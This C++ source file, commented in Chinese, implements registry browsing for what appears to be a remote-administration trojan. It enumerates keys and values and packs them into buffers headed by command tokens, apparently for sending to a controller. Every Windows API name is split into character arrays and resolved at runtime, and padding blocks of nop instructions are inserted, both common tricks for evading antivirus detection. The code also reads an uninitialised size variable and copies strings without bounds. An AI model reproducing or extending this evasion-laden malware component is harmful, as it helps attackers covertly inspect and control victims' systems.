// RegeditOpt.cpp: implementation of the RegeditOpt class.
//
//////////////////////////////////////////////////////////////////////
#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include "RegeditOpt.h"
#include "Registry.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////

RegeditOpt::RegeditOpt()
{

}



RegeditOpt::RegeditOpt(char b)
{
	switch(b){
	   case MHKEY_CLASSES_ROOT:
                MKEY=HKEY_CLASSES_ROOT;
		   break;
	   case MHKEY_CURRENT_USER:
            MKEY=HKEY_CURRENT_USER;
		   break;
	   case MHKEY_LOCAL_MACHINE:
		   MKEY=HKEY_LOCAL_MACHINE;
		   break;
	   case MHKEY_USERS:
		   MKEY=HKEY_USERS;
		   break;
	   case MHKEY_CURRENT_CONFIG:
		   MKEY=HKEY_CURRENT_CONFIG;
		   break;
	   default:
            MKEY=HKEY_LOCAL_MACHINE;
		break;
	}
    ZeroMemory(KeyPath,MAX_PATH);
}

void RegeditOpt::SetPath(char *path)
{
	ZeroMemory(KeyPath,MAX_PATH);
    strcpy(KeyPath,path);
}

RegeditOpt::~RegeditOpt()
{

}

char* RegeditOpt::FindPath()
{
    char *buf=NULL;
	HKEY		hKey;			//注册表返回句柄
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
}
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);

	char Sfxiw05[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),Sfxiw05);
	char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);

	char VnUDS05[] = {'R','e','g','Q','u','e','r','y','I','n','f','o','K','e','y','A','\0'};
	RegQueryInfoKeyAT pRegQueryInfoKeyA=(RegQueryInfoKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS05);
    if(pRegOpenKeyExA(MKEY,KeyPath,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//打开
	{
       	DWORD dwIndex=0,NameCnt,NameMaxLen;
		DWORD KeySize,KeyCnt,KeyMaxLen,MaxDateLen;
        //这就是枚举了
		if(pRegQueryInfoKeyA(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&MaxDateLen,NULL,NULL)!=ERROR_SUCCESS)
		{

			return NULL;
		}
		//一点保护措施

		 KeySize=KeyMaxLen+1;
	char Sfxiw07[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	char Sfxiw08[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary(Sfxiw08),Sfxiw07);
		char HrFvD15[] = {'R','e','g','E','n','u','m','K','e','y','E','x','A','\0'};
		RegEnumKeyExAT pRegEnumKeyExA=(RegEnumKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD15);
		if(KeyCnt>0&&KeySize>1){
		         int size=sizeof(REGMSG)+1;
		         
		          //buf=new char[KeyCnt*KeySize+size+1];
		          DWORD datasize=KeyCnt*KeySize+size+1;
		            buf=(char*)pLocalAlloc(LPTR, datasize);
		           ZeroMemory(buf,datasize);
	              buf[0]=(char)TOKEN_REG_PATH;           //命令头
		          REGMSG msg;                     //数据头
		          msg.size=KeySize;
		          msg.count=KeyCnt;
		          Gyfunction->my_memcpy(buf+1,(void*)&msg,size);
		
                  char * tmp=new  char[KeySize];
		          for(dwIndex=0;dwIndex<KeyCnt;dwIndex++)		//枚举项
				  {
			          ZeroMemory(tmp,KeySize);
			          DWORD i=KeySize;
			           pRegEnumKeyExA(hKey,dwIndex,tmp,&i,NULL,NULL,NULL,NULL);
			           strcpy(buf+dwIndex*KeySize+size,tmp);
				  }
		          delete[] tmp;
		          pRegCloseKey(hKey);
				  buf=(char*)pLocalReAlloc(buf, datasize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		
	}
		
    return buf;
}


char* RegeditOpt::FindKey()
{

		char	*szValueName;		//键值名称
//		char	*szKeyName;			//子键名称
		LPBYTE	szValueDate;		//键值数据
		__asm
		{
			nop
				nop
				nop
				nop
				nop
				nop
}
	char *buf=NULL;
	HKEY		hKey;			//注册表返回句柄
	char Sfxiw05[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),Sfxiw05);
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);

	char VnUDS05[] = {'R','e','g','Q','u','e','r','y','I','n','f','o','K','e','y','A','\0'};
	RegQueryInfoKeyAT pRegQueryInfoKeyA=(RegQueryInfoKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS05);
    if(pRegOpenKeyExA(MKEY,KeyPath,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//打开
	{
       	DWORD dwIndex=0,NameSize,NameCnt,NameMaxLen,Type;
		DWORD KeyCnt,KeyMaxLen,DataSize,MaxDateLen;
        //这就是枚举了
		if(pRegQueryInfoKeyA(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&MaxDateLen,NULL,NULL)!=ERROR_SUCCESS)
		{

			return NULL;
		}
		if(NameCnt>0&&MaxDateLen>0&&NameSize>0)
		{
			 DataSize=MaxDateLen+1;
			 NameSize=NameMaxLen+100;
			 REGMSG  msg;
             msg.count=NameCnt;        //总个数
			 msg.size=NameSize;          //名字大小
			 msg.valsize=DataSize;       //数据大小
			 int msgsize=sizeof(REGMSG);
			           // 头                   标记            名字                数据
			DWORD size=sizeof(REGMSG)+ sizeof(BYTE)*NameCnt+ NameSize*NameCnt+DataSize*NameCnt+10;
			buf=(char*)pLocalAlloc(LPTR, size);
			ZeroMemory(buf,size);
			buf[0]=(char)TOKEN_REG_KEY;         //命令头
            Gyfunction->my_memcpy(buf+1,(void*)&msg,msgsize);     //数据头

            szValueName=(char *)malloc(NameSize);
			szValueDate=(LPBYTE)malloc(DataSize);

			char VnUDS01[] = {'R','e','g','E','n','u','m','V','a','l','u','e','A','\0'};
			RegEnumValueAT pRegEnumValueA=(RegEnumValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS01);
			char *tmp=buf+msgsize+1;
			for(dwIndex=0;dwIndex<NameCnt;dwIndex++)	//枚举键值
			{
				 ZeroMemory(szValueName,NameSize);
				 ZeroMemory(szValueDate,DataSize);

			      DataSize=MaxDateLen+1;
			      NameSize=NameMaxLen+100;
			      
			      pRegEnumValueA(hKey,dwIndex,szValueName,&NameSize,NULL,&Type,szValueDate,&DataSize);//读取键值
			      
				  	if(Type==REG_SZ)
					{
				       tmp[0]=MREG_SZ;  
					}
			        if(Type==REG_DWORD)
					{
						//DWORD d;//=(DWORD)*szValueDate;
                      //  CRegistry reg(hKey);
					//	reg.Read(szValueName,&d);
					//	my_memcpy(szValueDate,(void*)&d,sizeof(DWORD));
				        tmp[0]=MREG_DWORD;  
					}
			        if(Type==REG_BINARY)
					{
				       tmp[0]=MREG_BINARY;
					}
			       if(Type==REG_EXPAND_SZ)
				   {
				       tmp[0]=MREG_EXPAND_SZ;
				   }
				   tmp+=sizeof(BYTE);
				   strcpy(tmp,szValueName);
				   tmp+=msg.size;
				   Gyfunction->my_memcpy(tmp,szValueDate,msg.valsize);
				   tmp+=msg.valsize;
			}
			free(szValueName);
			free(szValueDate);
			 buf=(char*)pLocalReAlloc(buf, size, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}   
			
	}
   return buf;
}
